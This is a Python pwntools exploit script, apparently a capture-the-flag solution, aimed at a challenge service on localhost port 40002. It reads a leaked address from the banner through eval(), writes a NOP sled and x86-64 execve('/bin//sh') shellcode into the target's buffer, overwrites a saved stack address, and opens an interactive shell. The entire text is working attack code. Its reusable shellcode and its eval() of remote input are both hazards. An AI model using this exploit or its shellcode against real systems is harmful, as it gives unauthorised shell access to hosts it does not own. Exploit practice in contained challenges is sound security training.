import pwn
import struct
import sys

f = open("inp", "wb")

def sendline_w(p, line):
    global f
    p.sendline(line)
    if type(line) == str:
        line = line.encode()
    line = line + b"\n"
    f.write(line)

def edit(p, pos, c):
    p.recvuntil(": ")
    sendline_w(p, str(pos))
    p.recvuntil(": ")
    if type(c) == int:
        sendline_w(p, bytes([c]))
    else:
        sendline_w(p, c)

def insert(p, pos, data):
    for i, d in enumerate(data):
        edit(p, pos+i, d)
        line = p.readline()
        #print(line)

# go go go
#p = pwn.process("docker/chall")
p = pwn.remote("localhost", 40002)
line = p.readline()
print(line)
print(p.readline())

line = line.decode('ascii')
approx_addr = line[line.find("(")+1:line.find(")")]
approx_addr = eval("0x" + approx_addr)

for i in range(300):
    line = p.readline()
    #print(line)
    edit(p, i, b"\x90")

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
insert(p, 300, shellcode)

target_address = 0x00007fffffffd770
stack_position = 0x00007fffffffdf88
offset = stack_position-target_address
insert(p, offset, pwn.p64(approx_addr + 270))

sendline_w(p, b"-1")
p.interactive()
